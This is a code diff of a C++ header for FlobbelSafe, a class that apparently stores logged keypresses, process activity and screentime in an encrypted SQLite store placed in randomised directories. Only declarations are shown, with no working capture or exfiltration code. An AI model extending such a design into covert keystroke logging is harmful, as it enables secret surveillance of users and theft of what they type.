@@ -8,13 +8,15 @@
 #include <fstream>
 #include <queue>
 #include <string>
+#include <random>
+#include <thread>
 
 #include "osrng.h"
 #include "aes.h"
 #include "modes.h"
 #include "filters.h"
 
-#include "sqlite3.h"
+#include "../dependencies/sqlite/sqlite3.h"
 
 #include "global_functions.h"
 
@@ -33,28 +35,38 @@ class FlobbelSafe {
 public:
     explicit FlobbelSafe(std::wstring &_safedir);
     ~FlobbelSafe();
-public:
-    void add_key(KeypressInfo &);
-    void add_prc(ProcessInfo &);
-    void add_screentime(Screentime &);
+    void save(const Info& info, Flob_constants::InfoType it);
+private:
+    void add_key(const KeypressInfo &);
+    void add_prc(const ProcessInfo &);
+    void add_screentime(const Screentime &);
 private:
     void finalize_queues();
     std::queue<std::wstring> keyQueue;
     std::queue<std::wstring> prcQueue;
-    std::wstring safedir, db_file;
 private:
     void encrypt_file(const std::wstring &file);
     void decrypt_file(const std::wstring &file);
     std::vector<CryptoPP::byte> buffer;
 private:
-    void hide();
-    void find();
     void init_map();
     uint32_t hash(std::wstring &text);
     std::map<uint32_t, std::wstring> rnd_directories;
 private:
     sqlite3 *dbcon;
     std::wstring keyTable, proTable;
+
+
+public:
+    void timer();
+    void sync();
+    void export_tables();
+private:
+    bool end_timer = false;
+    std::thread *tmrThread = nullptr;
+    std::random_device rd;
+    std::mt19937_64 mt;
+    std::uniform_int_distribution<uint32_t> dist;
 };
 
 #endif //FLOBBEL_FLOBBELSAFE_H
